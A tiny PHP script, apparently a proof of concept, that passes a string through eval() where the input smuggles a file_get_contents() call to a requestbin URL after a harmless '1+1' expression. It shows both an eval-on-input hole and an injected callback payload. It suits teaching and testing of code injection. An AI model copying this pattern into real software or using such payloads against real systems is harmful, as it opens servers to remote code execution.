<?php


$input = '1+1;file_get_contents(\'http://requestbin.fullcontact.com/1197etz1\')';
eval('$result = '.$input.';');
echo $result;
?>
